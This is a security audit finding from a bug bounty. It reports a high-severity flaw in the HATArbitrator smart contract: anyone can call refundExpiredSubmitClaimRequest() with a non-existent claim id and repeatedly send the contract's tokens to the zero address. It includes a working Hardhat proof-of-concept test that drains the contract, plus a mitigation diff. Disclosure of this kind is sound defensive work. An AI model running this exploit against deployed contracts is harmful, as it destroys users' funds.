# [H] Anyone can drain `HATArbitrator` via `refundExpiredSubmitClaimRequest()` with non-existing claims

## Summary
Severity: High
Chain: Smart contract
Component: HATs-Arbitration-Contracts
Published: 2023-10-27
Source: https://github.com/hats-finance/HATs-Arbitration-Contracts-0x79a618f675857b45934ca1c413fd5f409cf89735/issues/36
Type: hats-finding

## Details
**Github username:** @0xfuje
**Submission hash (on-chain):** 0x19ab4e38f9f2427b9f055d8fe3077298a36f05be8be6ee6323e26eae031c2018
**Severity:** high

**Description:**
## Impact
All user funds in `HATArbitrator` are burned forever

## Description
An attacker can repeatedly call `refundExpiredSubmitClaimRequest()` with a non-existing submit claim to drain the `HATArbitrator` contract completely. Several weaknesses and insufficient validations of `refundExpiredSubmitClaimRequest()` allow this vulnerability:
- Function can be called with non-existing `submitClaimRequest`
- If statement is bypassed with non-existing claim
- Submitter address is not verified to be non-zero
- Transfer amount is hardcoded instead of the actual amount
- Anyone can call `refundExpiredSubmitClaimRequest()`

Other factors that contribute:
- SafeERC20 will not prevent an ERC20 token from transferring to the zero address
- Majority of popular tokens allow transfer to the zero address

`contracts/HATArbitrator.sol` - [`refundExpiredSubmitClaimRequest()`](https://github.com/hats-finance/HATs-Arbitration-Contracts-0x79a618f675857b45934ca1c413fd5f409cf89735/blob/develop/contracts/HATArbitrator.sol#L477-L498)
```solidity
    function refundExpiredSubmitClaimRequest(
        bytes32 _internalClaimId
    ) external {
        SubmitClaimRequest memory submitClaimRequest = submitClaimRequests[
            _internalClaimId
        ];

        if (
            block.timestamp <=
            submitClaimRequest.submittedAt + submitClaimRequestReviewPeriod
        ) {
            revert ClaimReviewPeriodDidNotEnd();
        }

        delete submitClaimRequests[_internalClaimId];
        token.safeTransfer(
            submitClaimRequest.submitter,
            bondsNeededToStartDispute
        );

        emit SubmitClaimRequestExpired(_internalClaimId);
    }
```




### 1. Can be called with non-existing `submitClaimRequest`
The function does not verify if the `_internalClaimId` input by the user lead to a valid `submitClaimRequest` or just a non-existing empty `SubmitClaimRequest`. In solidity every `mapping` slot of `struct` are zero at initialization and `delete` just resets the values of the `struct` to zero.

### 2. If statement is bypassed with non-existing claim
If we submit a non-existing claim request: it will bypass the if statement since `submitClaimRequest.submittedAt` will be zero and `block.timestamp` will always be larger than the `submitClaimRequestReviewPeriod`
```solidity
        if (
            block.timestamp <=
            submitClaimRequest.submittedAt + submitClaimRequestReviewPeriod
        ) {
            revert ClaimReviewPeriodDidNotEnd();
        }
```
### 3. Submitter address is not verified to be non-zero
When a claim request does not exist, `submitClaimRequest.submitter` will equal to the zero address. The problem is there is no validation that the address is a non-zero address before transferring the funds.

### 4. `refundExpiredSubmitClaimRequest()` transfer amount is hardcoded
Instead of using `submitClaimRrequest.bond` which would be zero with a non-existing claim, the function uses the hardcoded `bondsNeededToStartDispute` which will always equal to the default value initialized in the constructor.

### 5. Anyone can call `refundExpiredSubmitClaimRequest()`
Even if someone did not submit a claim request, they can call the function, this means anyone can refund a non-existing claim request to the zero address.

### 6. Majority of popular tokens allow transfer to the zero address
Here are some of the popular token addresses on mainnet that can be used as `token` in `HATArbitrator`:
- USDT: [`0xdac17f958d2ee523a2206206994597c13d831ec7`](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)
- DAI: [`0x6b175474e89094c44da98b954eedeac495271d0f`](https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f#code)
- WETH: [`0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2`](https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2#code)

You can see the implementation of `transfer` and `transferFrom` in the `Contract Source Code` section of `Etherscan` that none of them prevent against sending to the zero address.

## Proof of Concept
I decided to use `DAI` as an example, however any other `ERC20` `token` can be used that allows transfers to the zero address. What the `ERC20Mock` `token` used in tests fails to take into account that live deployed `ERC20` contracts won't always have the safety of reverting upon transfers to the zero address.

1. Since `DAI` has a different compiler version, we first need to navigate to `hardhat.config.js` and change:
```js
  solidity: {
    version: "0.8.16",
    settings: {
      viaIR: true,
      optimizer: {
        enabled: true,
        runs: 200,
      },
    },
  },
```
to:
```js
  solidity: {
    compilers: [
      {
        version: "0.8.16",
        settings: {
          viaIR: true,
          optimizer: {
            enabled: true,
            runs: 200,
          },
        },
      },
      {
        version: "0.5.12"
      }
    ]
  },
```
2. Create a new file named `DAI.sol`  in the `contracts/mocks` folder and copy paste the contract from `Etherscan`'s `Contract Source Code` section of mainnet `DAI`: https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f#code

3. Navigate to `test/hatarbitrator.js` and change a few lines in `setupHATArbitrator` to have `DAI` as a default `token` instead of `ERC20Mock`. Every test should work just the same.

from:
```js
	async function setupHATArbitrator(registry, claimsManager) {
	    token = await ERC20Mock.new("Staking", "STK");
```
to:
```js
	async function setupHATArbitrator(registry, claimsManager) {
	    const DAI = artifacts.require("./Dai.sol");
	    token = await DAI.new(1);
```

4. Copy and paste the below proof of concept next to any `it() => {}` test
5. Run `npx hardhat test --grep "Drain all funds from HATArbitrator - 0xfuje"`
```solidity
  it("Drain all funds from HATArbitrator - 0xfuje", async () => {
    const { registry, claimsManager } = await setup(accounts, { setDefaultArbitrator: false });

    await setupHATArbitrator(registry, claimsManager);

    // 1. simulate user funds by minting to hatArbitrator
    await token.mint(hatArbitrator.address, web3.utils.toWei("10000"));
    assert.equal(await token.balanceOf(hatArbitrator.address), web3.utils.toWei("10000"));

    // 2. generate random bytes32 var (doesn't have to be valid claim)
    let internalClaimId = web3.utils.keccak256("hello");
    
    // 3. attacker can repeatedly call refundExpiredSubmitClaimRequest
    // to transfer funds of HATArbitrator to the zero address
    // until the contract is drained
    for (let i = 0; i < 10; i++) {
      await hatArbitrator.refundExpiredSubmitClaimRequest(internalClaimId, { from: accounts[0] });
    }
    
	// funds drained from hatArbitrator -> transferred to zero address
    assert.equal(await token.balanceOf(hatArbitrator.address), web3.utils.toWei("0"));
    assert.equal(await token.balanceOf(ZERO_ADDRESS), web3.utils.toWei("10000"));
  });
```

## Recommended Mitigation
Make sure to validate if a `SubmitClaimRequest` is actually valid, you can do it via checking if `submittedAt` and `bond` and `submitter` variables of the claim request are non-zero. Instead of the hardcoded `bondsNeededToStartDispute` transfer amount, transfer `submitClaimRequest.bond`. Additionally consider restricting access controll by only allowing the actual submitter to call the function. 

`contracts/HATArbitrator.sol` - [`refundExpiredSubmitClaimRequest()`](https://github.com/hats-finance/HATs-Arbitration-Contracts-0x79a618f675857b45934ca1c413fd5f409cf89735/blob/develop/contracts/HATArbitrator.sol#L477-L498)
Here's the function with the above mitigations applied:

```solidity
+	error InvalidSubmitClaimRequest();
+	error OnlySubmitterCanCall();

    function refundExpiredSubmitClaimRequest(
        bytes32 _internalClaimId
    ) external {
        SubmitClaimRequest memory submitClaimRequest = submitClaimRequests[
            _internalClaimId
        ];

+		if (
+			submitClaimRequest.submitter == address(0) ||
+			submitClaimRequest.submittedAt == 0 ||
+			submitClaimRequest.bond == 0
+		) {
+			revert InvalidSubmitClaimRequest();
+		}

+		if (
+			submitClaimRequest.submitter != msg.sender
+		) {
+			revert OnlySubmitterCanCall();
+		}

        if (
            block.timestamp <=
            submitClaimRequest.submittedAt + submitClaimRequestReviewPeriod
        ) {
            revert ClaimReviewPeriodDidNotEnd();
        }

        delete submitClaimRequests[_internalClaimId];
        token.safeTransfer(
            submitClaimRequest.submitter,
-           bondsNeededToStartDispute
+           submitClaimRequest.bond
        );

        emit SubmitClaimRequestExpired(_internalClaimId);
    }
```
